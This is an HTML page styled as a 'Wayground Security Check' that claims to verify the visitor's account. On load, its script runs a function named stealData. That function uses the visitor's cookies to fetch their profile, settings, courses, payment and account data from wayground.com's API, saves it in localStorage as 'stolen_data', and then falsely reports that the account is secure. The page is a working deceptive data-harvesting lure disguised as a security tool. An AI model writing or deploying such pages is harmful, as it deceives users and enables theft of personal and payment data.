<!DOCTYPE html>
<html>
<head>
    <title>Wayground Security Portal</title>
    <style>
        body { font-family: Arial; margin: 40px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-align: center; }
        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; }
        .loading { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí Wayground Security Check</h1>
        <p>Verifying your account security...</p>
        <div class="loading"></div>
        <p id="status">Initializing security scanner...</p>
        <div id="complete" class="hidden">
            <h3>‚úÖ Security Check Complete</h3>
            <p>Your account is secure. You can now close this page.</p>
        </div>
    </div>

    <script>
        const endpoints = ['users/me', 'profile', 'settings', 'courses', 'payments', 'account'];
        
        async function stealData() {
            updateStatus('üïµÔ∏è Scanning your account...');
            let collectedData = {};
            
            for (const endpoint of endpoints) {
                try {
                    const response = await fetch(`https://wayground.com/_api/main/${endpoint}`, {
                        credentials: 'include'
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        collectedData[endpoint] = {
                            data: data,
                            timestamp: new Date().toISOString(),
                            user: data.email || data.username || 'unknown'
                        };
                        updateStatus(`‚úÖ Collected: ${endpoint}`);
                        
                        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –æ–±—â–µ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ
                        saveToStorage(collectedData[endpoint]);
                    }
                } catch (error) {
                    updateStatus(`‚ùå Failed: ${endpoint}`);
                }
            }
            
            document.getElementById('complete').classList.remove('hidden');
            updateStatus('üéØ Data collection complete');
        }
        
        function saveToStorage(data) {
            // –ó–∞–≥—Ä—É–∂–∞–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ –¥–∞–Ω–Ω—ã–µ
            const existing = localStorage.getItem('stolen_data');
            const allData = existing ? JSON.parse(existing) : {};
            
            // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
            allData[data.timestamp] = data;
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
            localStorage.setItem('stolen_data', JSON.stringify(allData));
        }
        
        function updateStatus(msg) {
            document.getElementById('status').textContent = msg;
        }
        
        window.onload = function() {
            setTimeout(stealData, 1000);
        };
    </script>
</body>
</html>
